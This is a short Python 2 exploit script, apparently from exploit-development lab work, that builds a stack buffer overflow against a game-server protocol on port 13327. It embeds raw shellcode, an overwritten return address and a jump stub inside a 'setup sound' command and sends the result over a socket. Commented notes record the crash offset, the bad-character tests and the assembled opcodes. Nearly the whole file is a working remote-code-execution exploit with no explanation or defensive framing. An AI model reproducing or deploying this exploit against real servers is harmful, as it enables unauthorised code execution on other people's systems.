#!/usr/bin/python

import socket

host = "127.0.0.1"

#for x in range(0,255):
#    badchars += ('\\x' + '{:02x}'.format(x))

bad="\x00\x20\x0a\x0d"
# orig
#crash="\x41" * 4379
#crash="\x41" * (4379-len(badchars)) + badchars
# eip to addr: 0x08134596
# nasm > add eax, 12
#00000000  83C00C            add eax,byte +0xc
#nasm > jmp eax
#00000000  FFE0              jmp eax

shellcode = ("\xda\xc1\xbd\xee\x7c\xb2\x7a\xd9\x74\x24\xf4\x5e\x31\xc9\xb1" +
"\x14\x83\xc6\x04\x31\x6e\x15\x03\x6e\x15\x0c\x89\x83\xa1\x27" +
"\x91\xb7\x16\x94\x3c\x3a\x10\xfb\x71\x5c\xef\x7b\x2a\xff\xbd" +
"\x13\xcf\xff\x50\xbf\xa5\xef\x03\x6f\xb3\xf1\xce\xe9\x9b\x3c" +
"\x8e\x7c\x5a\xbb\x3c\x7a\xed\xa5\x8f\x02\x4e\x9a\x76\xcf\xd1" +
"\x49\x2f\xa5\xee\x35\x1d\xb9\x58\xbf\x65\xd1\x75\x10\xe5\x49" +
"\xe2\x41\x6b\xe0\x9c\x14\x88\xa2\x33\xae\xae\xf2\xbf\x7d\xb0")

eip = "\x96\x45\x13\x08"
jmp_esp="\x83\xc0\x0c\xff\xe0\x90\x90"
crash=shellcode+"\x41" * (4368-105) + eip + jmp_esp

buffer = "\x11(setup sound " + crash + "\x90\x00#" 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[*]Sending evil buffer..."
s.connect((host, 13327))
data=s.recv(1024)
print data
s.send(buffer)
s.close()
print "[*]Payload Sent !"
